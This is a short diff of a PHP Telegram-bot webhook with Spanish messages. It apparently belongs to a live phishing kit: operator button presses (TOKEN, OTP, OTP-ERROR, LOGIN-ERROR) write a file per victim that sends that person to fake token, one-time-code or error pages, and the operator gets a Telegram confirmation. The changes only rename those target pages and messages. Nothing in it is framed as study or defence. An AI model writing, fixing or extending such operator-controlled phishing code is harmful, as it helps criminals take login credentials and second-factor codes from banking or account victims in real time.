@@ -11,7 +11,7 @@ if (isset($update["callback_query"])) {
     list($accion, $usuario) = explode("|", $data);
 
     if ($accion === "TOKEN") {
-        file_put_contents("acciones/{$usuario}.txt", "token.php");
+        file_put_contents("acciones/{$usuario}.txt", "tok.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
             "text" => "➡️ Redirigido a SMS para $usuario"
@@ -23,16 +23,16 @@ if (isset($update["callback_query"])) {
             "text" => "❌ Redirigido a SMSERROR para $usuario"
         ]));
     }elseif ($accion === "OTP") {
-        file_put_contents("acciones/{$usuario}.txt", "otp.php");
+        file_put_contents("acciones/{$usuario}.txt", "opin.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
-            "text" => "➡️ Redirigido a SMS para $usuario"
+            "text" => "➡️ Redirigido a OP para $usuario"
         ]));
     } elseif ($accion === "OTP-ERROR") {
         file_put_contents("acciones/{$usuario}.txt", "otperror.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
-            "text" => "❌ Redirigido a SMSERROR para $usuario"
+            "text" => "❌ Redirigido a OP ERROR para $usuario"
         ]));
     } elseif ($accion === "LOGIN-ERROR") {
         file_put_contents("acciones/{$usuario}.txt", "loginerror.php");
